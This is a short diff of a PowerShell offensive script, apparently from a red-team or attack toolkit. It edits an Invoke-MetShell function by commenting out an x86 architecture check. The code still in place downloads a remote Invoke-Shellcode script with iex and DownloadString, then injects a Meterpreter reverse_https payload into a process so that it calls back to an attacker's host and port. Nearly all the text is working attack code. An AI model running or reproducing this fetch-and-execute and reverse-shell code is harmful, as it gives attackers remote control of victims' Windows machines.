@@ -66,16 +66,16 @@ function Invoke-MetShell
           )
     
     $procId = Run-Proc
-    if ($env:Processor_Architecture -ne "x86")
-    { 
-        write-warning 'Run x86 PowerShell'
-        &"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "iex((New-Object system.net.webclient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-ShellCode.ps1'));Invoke-Shellcode -ProcessId $procId -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Verbose -Force"
-    }
-    else
-    { 
+    #if ($env:Processor_Architecture -ne "x86")
+    #{ 
+    #    write-warning 'Run x86 PowerShell'
+    #    &"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "iex((New-Object system.net.webclient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-ShellCode.ps1'));Invoke-Shellcode -ProcessId $procId -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Verbose -Force"
+    #}
+    #else
+    #{ 
         iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-ShellCode.ps1'))
         Invoke-Shellcode -ProcessId $procId -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Verbose -Force
-    }
+    #}
 }
 
 function Run-Proc
